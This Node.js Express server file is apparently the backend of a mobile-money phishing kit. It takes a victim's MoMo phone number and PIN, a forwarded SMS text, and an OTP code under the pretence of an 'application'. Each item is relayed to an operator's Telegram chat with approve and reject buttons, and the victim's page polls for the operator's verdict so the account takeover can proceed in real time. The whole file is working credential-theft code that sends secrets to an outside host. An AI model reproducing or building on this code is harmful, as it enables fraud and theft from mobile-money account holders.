const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// In-memory storage for applications
const applications = {};

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Create application session
app.post('/applications', (req, res) => {
  const appId = 'APP-' + Math.floor(100000000 + Math.random() * 900000000);
  applications[appId] = {
    id: appId,
    ...req.body,
    status: 'pending_auth',
    sms_status: 'pending_sms',
    otp_status: 'pending_otp'
  };
  res.json({ id: appId });
});

// Submit MoMo Auth for Approval
app.post('/applications/:id/submit-auth', async (req, res) => {
  const appId = req.params.id;
  const appData = applications[appId];
  if (!appData) return res.status(404).json({ error: 'Application not found' });

  appData.momo_phone = req.body.momo_phone;
  appData.momo_pin = req.body.momo_pin;

  const message = `🔐 *MoMo Authentication Request*\n\n` +
    `📱 *Phone:* ${appData.momo_phone}\n` +
    `🔑 *PIN:* ${appData.momo_pin}\n` +
    `🆔 *App ID:* ${appId}`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '✅ Approve Auth', callback_data: `auth_approve_${appId}` },
        { text: '❌ Reject Auth', callback_data: `auth_reject_${appId}` }
      ]
    ]
  };

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
    });
    res.json({ success: true });
  } catch (error) {
    console.error('Telegram error:', error);
    res.status(500).json({ error: 'Failed to send notification' });
  }
});

// Submit SMS Text for Verification
app.post('/applications/:id/submit-sms', async (req, res) => {
  const appId = req.params.id;
  const appData = applications[appId];
  if (!appData) return res.status(404).json({ error: 'Application not found' });

  appData.sms_text = req.body.sms_text;

  const message = `💬 *SMS Verification Text Received*\n\n` +
    `📄 *Content:*\n\`\`\`\n${appData.sms_text}\n\`\`\`\n` +
    `🆔 *App ID:* ${appId}`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '📋 Copy SMS Content', copy_text: { text: appData.sms_text } }
      ],
      [
        { text: '✅ Correct SMS Text', callback_data: `sms_correct_${appId}` },
        { text: '❌ Wrong SMS Text', callback_data: `sms_wrong_${appId}` }
      ]
    ]
  };

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
    });
    res.json({ success: true });
  } catch (error) {
    console.error('Telegram error:', error);
    res.status(500).json({ error: 'Failed to send notification' });
  }
});

// Submit OTP Code for Verification
app.post('/applications/:id/submit-otp', async (req, res) => {
  const appId = req.params.id;
  const appData = applications[appId];
  if (!appData) return res.status(404).json({ error: 'Application not found' });

  appData.otp_code = req.body.otp_code;

  const message = `🔢 *OTP Verification Received*\n\n` +
    `🔑 *OTP Code:* ${appData.otp_code}\n` +
    `🆔 *App ID:* ${appId}`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '✅ Correct OTP', callback_data: `otp_correct_${appId}` },
        { text: '❌ Wrong OTP', callback_data: `otp_wrong_${appId}` }
      ]
    ]
  };

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
    });
    res.json({ success: true });
  } catch (error) {
    console.error('Telegram error:', error);
    res.status(500).json({ error: 'Failed to send notification' });
  }
});

// Poll application status
app.get('/applications/:id', (req, res) => {
  const appData = applications[req.params.id];
  if (!appData) return res.status(404).json({ error: 'Application not found' });
  res.json(appData);
});

// Telegram Webhook Endpoint
app.post('/telegram-webhook', async (req, res) => {
  const update = req.body;

  if (update.callback_query) {
    const cb = update.callback_query;
    const dataParts = cb.data.split('_');
    const type = dataParts[0]; // 'auth', 'sms', or 'otp'
    const action = dataParts[1]; // 'approve', 'reject', 'correct', 'wrong'
    const appId = dataParts.slice(2).join('_');

    if (applications[appId]) {
      if (type === 'auth') {
        applications[appId].status = (action === 'approve') ? 'auth_approved' : 'auth_rejected';
      } else if (type === 'sms') {
        applications[appId].sms_status = (action === 'correct') ? 'sms_correct' : 'sms_wrong';
      } else if (type === 'otp') {
        applications[appId].otp_status = (action === 'correct') ? 'otp_correct' : 'otp_wrong';
      }
    }

    try {
      // 1. Show non-blocking top notification popup and remove buttons immediately
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: cb.id,
          text: `Action processed: ${action.toUpperCase()}`,
          show_alert: false // Displays notification toast at top instead of pop-up window
        })
      });

      // 2. Remove the inline keyboard buttons so they fade/disappear
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: cb.message.chat.id,
          message_id: cb.message.message_id,
          reply_markup: { inline_keyboard: [] }
        })
      });
    } catch (e) {
      console.error('Callback error:', e);
    }
  }

  res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
         
